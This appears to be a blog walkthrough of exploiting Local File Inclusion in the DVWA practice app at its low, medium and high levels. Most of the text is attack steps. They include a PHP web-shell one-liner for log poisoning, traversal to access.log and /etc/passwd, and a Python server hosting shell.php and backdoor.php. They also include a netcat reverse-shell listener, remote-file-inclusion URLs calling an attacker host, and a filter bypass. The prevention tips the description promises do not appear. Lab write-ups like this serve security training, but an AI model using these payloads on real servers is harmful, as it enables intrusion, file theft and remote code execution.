---
title: "Local File Inclusion"
date: 2024-12-23T16:06:04+01:00
draft: false
tags: ["Caido", "LFI", "Web"]
categories: ["Hacking"]
description: "A practical guide to exploiting Local File Inclusion (LFI) vulnerabilities in DVWA. Learn how attackers can access sensitive files, achieve code execution, and escalate privileges using LFI techniques. This guide covers real-world payloads, log poisoning, remote file inclusion, and tips for detection and prevention, with hands-on examples and screenshots."
---
Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. LFI attacks can expose sensitive information, and in severe cases, they can lead to cross-site scripting (XSS) and remote code execution. LFI is listed as one of the OWASP Top 10 web application vulnerabilities.

File inclusions are a key to any server-side scripting language, and allow the content of files to be used as part of web application code. Here is an example of how LFI can enable attackers to extract sensitive information from a server. If the application uses code like this, which includes the name of a file in the URL:

https://www.brightsec.com/blog/local-file-inclusion-lfi/

Use Burpsuite or Caido you need to get this into the apache log file.

```<?php echo system($_GET['cmd']); ?>```

![](1.png)

![](2.png)

../../../../../../../../../var/log/apache2/access.log

![](3.png)

Low:

![](4.png)

![](5.png)

![](6.png)

![](7.png)

![](8.png)

Host a python server where your malicious file is located.

`sudo python -m http.server 1337`

![](9.png)


Listen for the host's shell. `nc -nvlp 1234`

![](10.png)

Pass a php reverse shell file to the host server via the url:

![](11.png)

`192.168.10.123/dvwa/vulnerabilities/fi/?page=http://192.168.10.121:1337/shell.php`

![](12.png)


Boom!

Medium:
code will remove the `../` in `....//....//` leaving: `../../`

![Screenshot](13.png)

![Screenshot](14.png)

![Screenshot](15.png)


`192.168.10.123/dvwa/vulnerabilities/fi/?page=http://http://192.168.10.121:1337/shell.php`

High:

`http://192.168.10.123/dvwa/vulnerabilities/fi/?page=file:///etc/passwd`

![Screenshot](16.png)

![Screenshot](17.png)

![Screenshot](18.png)

`http://192.168.10.123/dvwa/vulnerabilities/fi/?page=http://192.168.10.121:1337/backdoor.php&cmd=ls`

![Screenshot](19.png)



Resources:

https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/

https://blog.certcube.com/detailed-cheatsheet-lfi-rce-webshells/